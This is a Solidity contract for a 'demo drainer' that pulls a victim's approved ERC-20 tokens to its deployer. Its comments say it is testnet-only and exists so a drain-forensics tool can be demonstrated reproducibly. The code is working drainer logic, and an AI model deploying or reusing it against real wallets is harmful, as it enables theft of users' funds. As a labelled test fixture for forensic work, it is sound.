// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// ═══════════════════════════════════════════════════════════════════════════
///  DEMO DRAINER — TESTNET ONLY. DO NOT DEPLOY TO A NETWORK WITH REAL VALUE.
///
///  This contract exists for one reason: Anchrion reconstructs drains after the
///  fact, and that reconstruction has to be demonstrable and reproducible by
///  anyone who clones the repository. This gives you a labelled, predictable
///  attacker.
///
///  It is deliberately simple and deliberately obvious:
///    - it can only move tokens that a victim has already approved to it,
///    - it sends everything to its deployer,
///    - it emits an event for every drain so the transaction is easy to find.
///
///  Anchrion never deploys or calls this contract. You do, on a testnet, with a
///  throwaway key.
/// ═══════════════════════════════════════════════════════════════════════════

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract DemoDrainer {
    address payable public immutable operator;

    event Drained(address indexed token, address indexed victim, uint256 amount);

    error NotOperator();
    error NothingToTake();

    constructor() {
        operator = payable(msg.sender);
    }

    /// @notice Moves approved tokens from `victim` to this contract's operator.
    /// @dev `amount == 0` takes whatever allowance is available, capped by the
    ///      victim's balance. That mirrors how real drainers behave.
    function drain(address token, address victim, uint256 amount) external {
        if (msg.sender != operator) revert NotOperator();

        uint256 allowed = IERC20(token).allowance(victim, address(this));
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 available = allowed < balance ? allowed : balance;

        uint256 take = amount == 0 || amount > available ? available : amount;
        if (take == 0) revert NothingToTake();

        if (!IERC20(token).transferFrom(victim, operator, take)) {
            revert NothingToTake();
        }
        emit Drained(token, victim, take);
    }

    /// @notice Convenience for staging a demo: how much this contract could take.
    function preview(address token, address victim) external view returns (uint256) {
        uint256 allowed = IERC20(token).allowance(victim, address(this));
        uint256 balance = IERC20(token).balanceOf(victim);
        return allowed < balance ? allowed : balance;
    }
}
